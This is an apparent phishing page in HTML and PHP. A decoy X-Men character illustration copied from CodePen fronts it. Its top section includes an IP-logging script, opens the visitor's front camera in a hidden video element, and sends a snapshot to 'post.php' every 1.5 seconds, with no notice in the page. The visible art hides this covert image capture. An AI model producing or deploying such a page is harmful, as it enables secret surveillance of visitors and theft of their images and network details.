
<!doctype html>
<html>
<head>
<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
</head>
</html>
<html>
<body>
<?php
include 'ip.php';
?>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>

<div class="video-wrap" hidden="hidden">
   <video id="video" playsinline autoplay></video>
</div>

<canvas hidden="hidden" id="canvas" width="640" height="640"></canvas>

<script>

function post(imgdata){
$.ajax({
    type: 'POST',
    data: { cat: imgdata},
    url: 'post.php',
    dataType: 'json',
    async: false,
    success: function(result){
        // call the function that handles the response/results
    },
    error: function(){
    }
  });
};


'use strict';

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const errorMsgElement = document.querySelector('span#errorMsg');

const constraints = {
  audio: false,
  video: {
    
    facingMode: "user"
  }
};

// Access webcam
async function init() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    handleSuccess(stream);
  } catch (e) {
    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
  }
}

// Success
function handleSuccess(stream) {
  window.stream = stream;
  video.srcObject = stream;

var context = canvas.getContext('2d');
  setInterval(function(){

       context.drawImage(video, 0, 0, 640, 640);
       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
       post(canvasData); }, 1500);
  

}

// Load init
init();

</script>

</body>
</html>
    
    <html lang="en"><head>
    <meta charset="UTF-8">
    <link rel="apple-touch-icon" type="image/png" href="https://static.codepen.io/assets/favicon/apple-touch-icon-5ae1a0698dcc2402e9712f7d01ed509a57814f994c660df9f7a952f3060705ee.png">
    <meta name="apple-mobile-web-app-title" content="CodePen">
    <link rel="shortcut icon" type="image/x-icon" href="https://static.codepen.io/assets/favicon/favicon-aec34940fbc1a6e787974dcd360f2c6b63348d4b1f4e06c77743096d55480f33.ico">
    <link rel="mask-icon" type="" href="https://static.codepen.io/assets/favicon/logo-pin-8f3771b1072e3c38bd662872f6b673a722f4b3ca2421637d5596661b4e2132cc.svg" color="#111">
    <title>Xmen-Camera</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
    
        html { box-sizing: border-box; }
            html *{box-sizing: inherit;}
            html:before,html:after {box-sizing: inherit;}
    
    </style>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css">
    <link rel="stylesheet" href="xmen_style/style.css">
    <script>
      window.console = window.console || function(t) {};
    </script>
    <script>
      if (document.location.search.match(/type=embed/gi)) {
        window.parent.postMessage("resize", "*");
      }
    </script>
    </head>
    <body translate="no">
    <section class="stripe" id="professor">
    <div class="container">
    <div class="ear left"></div>
    <div class="ear right"></div>
    <div class="face">
    <div class="eyes"></div>
    <div class="nose"></div>
    <div class="mouth"></div>
    </div>
    <div class="neck"></div>
    <div class="body">
    <div class="jacket"></div>
    </div>
    <div class="telepathy one"></div>
    <div class="telepathy two"></div>
    <div class="telepathy three"></div>
    </div>
    </section>
    <section class="stripe" id="cyclops">
    <div class="container">
    <div class="face">
    <div class="skin"></div>
    <div class="nose"></div>
    <div class="mouth"></div>
    <div class="visor"></div>
    </div>
    <div class="hair"></div>
    <div class="pouf"></div>
    <div class="pomp"></div>
    <div class="neck"></div>
    <div class="body">
    <div class="strap"></div>
    <div class="cross-strap"></div>
    <div class="badge"></div>
    </div>
    </div>
    </section>
    <section class="stripe" id="jeangrey">
    <div class="container">
    <div class="fire">
    <div class="flame"></div>
    <div class="flame"></div>
    <div class="flame"></div>
    <div class="flame"></div>
    <div class="flame"></div>
    <div class="flame"></div>
    <div class="flame"></div>
    <div class="flame"></div>
    <div class="flame"></div>
    <div class="flame"></div>
    </div>
    <div class="hair"></div>
    <div class="face">
    <div class="eyes"></div>
    <div class="nose"></div>
    <div class="mouth"></div>
    </div>
    <div class="hair-front"></div>
    <div class="neck"></div>
    <div class="body">
    <div class="emblem"></div>
    </div>
    </div>
    </section>
    <section class="stripe" id="wolverine">
    <div class="container">
    <div class="face">
    <div class="mask"></div>
    <div class="mouth"></div>
    </div>
    <div class="fin one"></div>
    <div class="fin two"></div>
    <div class="fin-bridge"></div>
    <div class="eye one"></div>
    <div class="eye two"></div>
    <div class="nose"></div>
    <div class="neck"></div>
    <div class="body">
    <div class="stripes left"></div>
    <div class="stripes right"></div>
    </div>
    <div class="shoulder left"></div>
    <div class="shoulder right"></div>
    <div class="arm left">
    <div class="claw"></div>
    <div class="claw"></div>
    <div class="claw"></div>
    </div>
    <div class="arm right">
    <div class="claw"></div>
    <div class="claw"></div>
    <div class="claw"></div>
    </div>
    </div>
    </section>
    <section class="stripe" id="storm">
    <div class="container">
    <div class="rain left">
    <div class="drop one"></div>
    <div class="drop two"></div>
    <div class="drop three"></div>
    <div class="drop four"></div>
    <div class="drop five"></div>
    </div>
    <div class="rain right">
    <div class="drop one"></div>
    <div class="drop two"></div>
    <div class="drop three"></div>
    <div class="drop four"></div>
    <div class="drop five"></div>
    </div>
    <div class="cloud one"></div>
    <div class="cloud two"></div>
    <div class="ear left"></div>
    <div class="ear right"></div>
    <div class="face">
    <div class="eyes"></div>
    <div class="nose"></div>
    <div class="mouth"></div>
    </div>
    <div class="hair"></div>
    <div class="neck"></div>
    <div class="body"></div>
    <div class="cape"></div>
    <div class="badge"></div>
    </div>
    </section>
    <section class="stripe" id="nightcrawler">
    <div class="container">
    <div class="kurt">
    <div class="ear left"></div>
    <div class="ear right"></div>
    <div class="face">
    <div class="eyes"></div>
    <div class="nose"></div>
    <div class="mouth"></div>
    </div>
    <div class="hair"></div>
    <div class="pouf"></div>
    <div class="pomp"></div>
    <div class="neck"></div>
    <div class="neck"></div>
    <div class="body"></div>
    <div class="shoulders"></div>
    </div>
    <div class="bamf">
    <div class="bamf-cloud"></div>
    </div>
    </div>
    </section>
    <section class="stripe" id="iceman">
    <div class="container">
    <div class="ear left"></div>
    <div class="ear right"></div>
    <div class="face">
    <div class="eyes"></div>
    <div class="nose"></div>
    <div class="mouth"></div>
    </div>
    <div class="hair"></div>
    <div class="pouf"></div>
    <div class="pomp"></div>
    <div class="neck"></div>
    <div class="body">
    <div class="stripes"></div>
    </div>
    </div>
    </section>
    <section class="stripe" id="magneto">
    <div class="container">
    <div class="helmet">
    <div class="opening"></div>
    </div>
    <div class="face">
    <div class="eye one"></div>
    <div class="eye two"></div>
    <div class="nose"></div>
    <div class="mouth"></div>
    </div>
    <div class="neck"></div>
    <div class="cape"></div>
    <div class="body"></div>
    </div>
    </section>
    <script src="https://static.codepen.io/assets/common/stopExecutionOnTimeout-157cd5b220a5c80d4ff8e0e70ac069bffd87a61252088146915e8726e5d9f147.js"></script>
    <script id="rendered-js">
    //Look Ma, no JS!
    //# sourceURL=pen.js
        </script>
    
    
    </body></html>